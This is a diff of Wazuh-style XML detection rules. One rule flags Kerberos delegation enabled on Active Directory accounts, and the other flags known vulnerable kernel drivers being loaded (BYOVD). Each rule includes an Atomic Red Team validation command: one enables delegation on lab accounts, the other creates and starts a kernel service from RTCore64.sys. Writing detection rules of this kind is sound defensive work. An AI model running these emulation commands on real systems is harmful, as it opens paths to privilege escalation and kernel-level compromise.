+    <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
+    <field name="win.eventdata.attributeLDAPDisplayName" type="pcre2">(?i)^userAccountControl$</field>
+    <field name="win.eventdata.attributeValue" type="pcre2">(?i)524288|16777216</field>
     <description>Unconstrained or Constrained Delegation Enabled on an Account (2/2: uac_trusted_for_delegation)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1098): Set-ADAccountControl -Identity SRV01$ -TrustedForDelegation $true | Set-ADUser svc_web -Add @{'msDS-AllowedToDelegateTo'='CIFS/dc01.tyrian.lab'}</info>
@@ -1523,8 +1523,8 @@
 <group name="sysmon,">
   <rule id="100184" level="14">
     <if_group>sysmon_event1</if_group>
-    <field name="win.system.eventID">^6$</field>
-    <field name="win.eventdata.imageLoaded" type="pcre2">\\iqvw64e\.sys$|\\RTCore64\.sys$|\\gdrv\.sys$|\\dbutil_2_3\.sys$|\\DBUtilDrv2\.sys$|\\procexp152\.sys$|\\truesight\.sys$|\\viragt64\.sys$|\\aswArPot\.sys$|\\mhyprot2\.sys$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^6$</field>
+    <field name="win.eventdata.imageLoaded" type="pcre2">(?i)\\iqvw64e\.sys$|\\RTCore64\.sys$|\\gdrv\.sys$|\\dbutil_2_3\.sys$|\\DBUtilDrv2\.sys$|\\procexp152\.sys$|\\truesight\.sys$|\\viragt64\.sys$|\\aswArPot\.sys$|\\mhyprot2\.sys$</field>
     <description>Known Vulnerable Driver Loaded (BYOVD)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1068): sc create tyriantest binPath= C:\Windows\Temp\RTCore64.sys type= kernel | sc start tyriantest</info>
